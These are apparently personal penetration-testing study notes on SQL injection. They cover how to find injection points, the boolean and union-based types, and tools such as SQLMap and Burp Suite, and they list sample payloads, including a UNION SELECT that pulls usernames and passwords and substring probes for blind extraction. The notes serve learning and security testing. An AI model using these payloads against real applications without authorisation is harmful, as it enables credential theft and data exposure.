
### General Notes

> Unauthorized user take control over SQL statements used by a web application.
> To explot SQL Injections, first find the injection point, and then craft a payload to take control over a query.
> Try TRUE and FALSE injections to check which one works.

> SQL queries inside web applications must connect to the database, submit the query, and then retrieve the results.

> Can use [[SQLMap]] to automate this test.

---

### Finding SQL Injections

> Test all user inputs.
> Test these areas: 
* GET parameters.
* POST parameters.  //Use [[Burp Suite]] proxy
* [[HTTP]] headers.

#### Types of Injections
> Boolean Injections.  Need a lot of requests to dump data.
> Union Based Injections.

---

### Payloads

> Try injecting: 
* String terminators: `'` and `"`.
* Other SQL commands: `SELECT`, `UNION`.
* SQL comments: ` -- `.

##### Example Payloads
> `' OR 'a'='a ` .
> `' UNION SELECT Username, Password FROM Accounts WHERE 'a'='a `.
> `' UNION SELECT user(); -- - `. // comment then space then `-` to remove remainder of the query.
> `2' AND 1=1; -- - `.
> `' UNION SELECT '', '', ''; -- - ` //keep adding inputs to identify the number of fields in the query.

---

### Extra Info

> Commands to identify first character of username.
```
select user(); // returns the current user
select substring(string,position,length); //substring from the position and takes length many chrs.
example: select substring(user(),1,1)='r'; // checks if first letter from user is r.
```

---
